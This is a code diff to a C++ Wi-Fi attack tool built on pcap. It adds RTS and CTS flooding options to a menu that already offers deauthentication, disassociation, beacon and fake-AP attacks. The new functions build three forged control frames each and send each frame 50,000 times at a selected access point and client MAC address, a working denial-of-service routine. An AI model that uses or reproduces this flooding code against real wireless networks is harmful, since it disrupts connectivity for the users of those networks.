@@ -44,6 +44,8 @@ void exe_arp(pcap_t* handle,vector<uint8_t> &sel_mac);
 void exe_fake(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap, map<vector<uint8_t>,struct ap> ap_ls);
 void exe_disasso(pcap_t* handle,vector<uint8_t> sel_mac);
 void exe_reasso(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);
+void exe_rts(pcap_t *handle, vector<uint8_t> sel_mac, struct ap sel_ap);
+void exe_cts(pcap_t *handle, vector<uint8_t> sel_mac, struct ap sel_ap);
 
 void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel);
 void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size);
@@ -183,8 +185,12 @@ int main(int argc, char *argv[])
     printf("    [5] Deauth Attack & Checking \n");
     printf("                               ");
     printf("    [6] Disasso Attack & Checking \n");
-    printf("                               ");
-    printf("    [7] Exit \n");
+	printf("                               ");
+	printf("    [7] RTS Flooding \n");
+	printf("                               ");
+	printf("    [8] CTS Flooding \n");
+	printf("                               ");
+	printf("    [9] Exit \n");
     printf("                               ");
     printf("------------------------------------------\n");
     printf("select Menu Number : ");
@@ -207,7 +213,9 @@ int main(int argc, char *argv[])
         case 4 : exe_beacon(handle,sel_mac,sel_ap);break;
         case 5 : exe_deauth(handle,sel_mac);break;
         case 6 : exe_disasso(handle,sel_mac);break;
-        case 7 : return 0;
+		case 7: exe_rts(handle, sel_mac, sel_ap); break;
+		case 8: exe_cts(handle, sel_mac, sel_ap); break;
+		case 9: return 0;
         default: continue;
     }
 
@@ -1434,3 +1442,35 @@ void help_intro(){
 }
 
 
+void exe_rts(pcap_t *handle, vector<uint8_t> sel_mac, struct ap sel_ap) {
+
+	uint8_t rts_size;
+	uint8_t *rts1 = make_rts(sel_mac, sel_ap, (uint8_t*)&rts_size);
+	uint8_t *rts2 = make_rts(sel_mac, sel_ap, (uint8_t*)&rts_size);
+	uint8_t *rts3 = make_rts(sel_mac, sel_ap, (uint8_t*)&rts_size);
+	printf("~rts Flooding~\n");
+
+	for (int i = 0; i < 50000; i++) {
+		if (pcap_sendpacket(handle, rts1, rts_size) != 0) printf("\nsend packet Error \n");
+		if (pcap_sendpacket(handle, rts2, rts_size) != 0) printf("\nsend packet Error \n");
+		if (pcap_sendpacket(handle, rts3, rts_size) != 0) printf("\nsend packet Error \n");
+
+	}
+
+
+
+}
+void exe_cts(pcap_t *handle, vector<uint8_t> sel_mac, struct ap sel_ap) {
+	uint8_t cts_size;
+	uint8_t *cts1 = make_cts(sel_mac, sel_ap, (uint8_t*)&cts_size);
+	uint8_t *cts2 = make_cts(sel_mac, sel_ap, (uint8_t*)&cts_size);
+	uint8_t *cts3 = make_cts(sel_mac, sel_ap, (uint8_t*)&cts_size);
+	printf("~cts Flooding~\n");
+
+	for (int i = 0; i < 50000; i++) {
+		if (pcap_sendpacket(handle, cts1, cts_size) != 0) printf("\nsend packet Error \n");
+		if (pcap_sendpacket(handle, cts2, cts_size) != 0) printf("\nsend packet Error \n");
+		if (pcap_sendpacket(handle, cts3, cts_size) != 0) printf("\nsend packet Error \n");
+
+	}
+}
